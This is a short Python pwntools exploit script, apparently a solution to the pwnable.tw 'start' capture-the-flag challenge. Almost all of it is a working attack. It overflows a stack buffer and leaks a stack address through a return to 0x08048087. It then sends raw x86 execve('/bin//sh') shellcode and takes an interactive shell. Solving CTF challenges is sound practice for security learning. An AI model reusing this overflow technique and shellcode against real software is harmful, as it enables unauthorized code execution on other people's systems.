
from pwn import *
#context.log_level = 'debug'
#context.terminal = ['terminator','-x','bash','-c']

cn = process('./start')
#cn = remote('chall.pwnable.tw', 10000)

gdb.attach(cn)

cn.recv()
pay = 'a'*20+p32(0x08048087) #0x08048087
cn.send(pay)
sleep(0.5)

data = u32(cn.recv()[:4])
success('data: '+hex(data))
stack = data+0x14
success('stack: '+hex(stack))

pay = 'a'*20+p32(stack)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
#pay = 'a'*20 +p32(stack+4)+asm(shellcraft.sh())
print "[*]len of pay is %d"%(len(pay))
cn.send(pay)

cn.interactive()
